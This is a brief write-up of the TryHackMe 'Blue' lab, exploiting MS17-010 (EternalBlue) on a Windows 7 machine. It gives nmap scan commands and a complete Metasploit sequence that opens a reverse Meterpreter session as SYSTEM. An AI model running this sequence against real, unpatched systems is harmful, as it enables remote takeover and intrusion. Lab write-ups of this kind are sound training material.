# Blue — EternalBlue (MS17-010)

**Platform:** TryHackMe  
**OS:** Windows 7 Professional SP1 x64  
**Difficulty:** Easy  
**CVE:** CVE-2017-0143  
**Access:** NT AUTHORITY\SYSTEM

---

## 1. Enumeration

```bash
nmap -sV 10.113.162.73
```

Open ports:
- 135 — Windows RPC
- 139 — NetBIOS
- 445 — SMB (Windows 7 SP1)
- 3389 — RDP

**Vulnerability Scan:**
```bash
nmap --script vuln -p 445 10.113.162.73
```
Result: Machine is vulnerable to **MS17-010 (EternalBlue)**

---

## 2. Vulnerability

MS17-010 is a critical RCE in SMBv1. Originally developed by the NSA, leaked by Shadow Brokers in 2017, and later used in the WannaCry ransomware attack. The flaw allows buffer overflow via crafted SMB packets, giving SYSTEM-level code execution.

---

## 3. Exploitation

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.113.162.73
set LHOST tun0
run
```

Result: Meterpreter session opened successfully.

---

## 4. Privilege Escalation

Not required — EternalBlue executes directly as **NT AUTHORITY\SYSTEM**.
